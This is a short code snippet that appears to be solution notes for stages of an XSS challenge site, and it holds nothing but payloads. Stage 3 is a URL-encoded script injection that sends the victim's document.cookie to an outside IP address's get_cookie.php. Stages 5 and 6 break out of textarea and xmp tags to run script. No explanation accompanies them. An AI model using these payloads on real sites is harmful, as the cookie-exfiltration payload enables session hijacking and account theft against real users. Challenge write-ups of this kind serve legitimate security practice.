

{% highlight python linenos %}
stage3:
http://68e3b596ebf790e8a781b8d87b84af7eb7b0aeb3.knock.xss.moe/?q=%22%3E%3Cscript%20language%3D%22JavaScript%22%3Edocument.location%3D%27http%3A%2f%2f118.69.135.163%2fget_cookie.php%3Fcookie%3D%27%2bdocument.cookie%3B%3C%2fscript%3E

stage5:
</textarea><script>alert('xxx')</script>

stage6:
</xmp><script>alert('xxx')</script>
{% endhighlight %}
